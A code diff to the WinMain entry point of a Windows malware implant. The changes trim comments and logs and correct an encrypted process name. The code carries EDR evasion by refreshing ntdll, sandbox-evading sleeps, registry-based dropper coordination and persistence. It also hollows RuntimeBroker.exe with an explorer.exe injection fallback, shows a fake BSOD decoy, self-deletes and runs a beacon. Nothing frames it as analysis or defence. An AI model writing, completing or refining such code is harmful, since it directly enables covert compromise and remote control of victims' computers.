@@ -56,7 +56,6 @@ namespace {
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd) {
     (void)hInstance; (void)hPrevInstance; (void)lpCmdLine; (void)nShowCmd;
 
-    // 1. Critical: Unhook immediately to bypass behavioral hooks
     evasion::Unhooker::RefreshNtdll();
     evasion::SyscallResolver::GetInstance();
 
@@ -68,7 +67,6 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     LOG_INFO("--- WINMAIN ---");
     LOG_INFO("PATH: " + utils::ws2s(currentPath));
 
-    // Delay major actions to avoid sandbox correlation
     Sleep(10000 + (GetTickCount() % 10000));
 
     HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
@@ -84,12 +82,8 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
                 LOG_INFO("IPC: Found dropper: " + utils::ws2s(dropperPath));
                 Sleep(20000);
                 persistence::establishPersistence(dropperPath);
-            } else {
-                LOG_WARN("IPC: Failed to read path.");
             }
             RegCloseKey(hKey);
-        } else {
-            LOG_WARN("IPC: Failed to open key.");
         }
         beacon::Beacon implant;
         implant.run();
@@ -105,32 +99,28 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
         return 0;
     }
 
-    // Dropper Instance
+    // Dropper
     LOG_INFO("ROLE: Dropper.");
     HKEY hKey;
     if (RegCreateKeyExW(HKEY_CURRENT_USER, utils::DecryptW(kVolatileEnv).c_str(), 0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
-        if (RegSetValueExW(hKey, utils::DecryptW(kDropperPath).c_str(), 0, REG_SZ, (LPBYTE)currentPathBuf, (DWORD)(wcslen(currentPathBuf) + 1) * sizeof(wchar_t)) == ERROR_SUCCESS) {
-             LOG_INFO("IPC: Stored path successfully.");
-        } else {
-             LOG_ERR("IPC: Failed to store path.");
-        }
+        RegSetValueExW(hKey, utils::DecryptW(kDropperPath).c_str(), 0, REG_SZ, (LPBYTE)currentPathBuf, (DWORD)(wcslen(currentPathBuf) + 1) * sizeof(wchar_t));
         RegCloseKey(hKey);
+        LOG_INFO("IPC: Dropper path stored.");
     }
 
     std::vector<uint8_t> selfImage = GetSelfImage();
     if (!selfImage.empty()) {
-        LOG_INFO("Attempting stealth relocation...");
+        LOG_INFO("Attempting relocation...");
 
-        // 2. High Stealth: Early Bird hollowing into a boring process
         wchar_t systemPath[MAX_PATH];
         GetSystemDirectoryW(systemPath, MAX_PATH);
-        // "RuntimeBroker.exe" -> \x10\x31\x3A\x30\x2D\x29\x31\x00\x36\x3B\x2F\x31\x36\x54\x31\x2C\x31
-        std::wstring target = std::wstring(systemPath) + L"\\" + utils::DecryptW(L"\x10\x31\x3A\x30\x2D\x29\x31\x00\x36\x3B\x2F\x31\x36\x54\x31\x2C\x31");
+        // Corrected "RuntimeBroker.exe": L"\x08\x2F\x34\x2E\x33\x37\x3F\x18\x28\x35\x31\x3F\x28\x74\x3F\x22\x3F"
+        std::wstring rb = utils::DecryptW(L"\x08\x2F\x34\x2E\x33\x37\x3F\x18\x28\x35\x31\x3F\x28\x74\x3F\x22\x3F");
+        std::wstring target = std::wstring(systemPath) + L"\\" + rb;
 
         LOG_INFO("Hollowing target: " + utils::ws2s(target));
         if (evasion::Injector::HollowProcess(target, selfImage)) {
-            LOG_INFO("Relocation successful. Waiting for foothold...");
-            Sleep(15000); // Wait for foothold to start
+            LOG_INFO("Relocation successful.");
             decoy::ShowBSOD();
             CoUninitialize();
             utils::SelfDeleteAndExit();
@@ -139,8 +129,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
 
         LOG_WARN("Hollowing failed. Trying explorer.exe injection...");
         if (evasion::Injector::InjectIntoExplorer(selfImage)) {
-            LOG_INFO("Injection success. Waiting for foothold...");
-            Sleep(15000); // Wait for foothold to start
+            LOG_INFO("Injection success.");
             decoy::ShowBSOD();
             CoUninitialize();
             utils::SelfDeleteAndExit();
@@ -148,7 +137,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
         }
     }
 
-    LOG_WARN("Relocation failed completely. Launching stable copy.");
+    LOG_WARN("Relocation failed. Launching stable copy.");
     std::wstring persistPath = persistence::establishPersistence();
     if (!persistPath.empty() && lstrcmpiW(currentPathBuf, persistPath.c_str()) != 0) {
         LOG_INFO("Launching stable copy: " + utils::ws2s(persistPath));
@@ -156,7 +145,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
         RtlZeroMemory(&si, sizeof(si)); si.cb = sizeof(si);
         if (CreateProcessW(persistPath.c_str(), NULL, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
             CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
-            LOG_INFO("Stable copy launched.");
+            LOG_INFO("Stable copy active.");
         }
     }
 
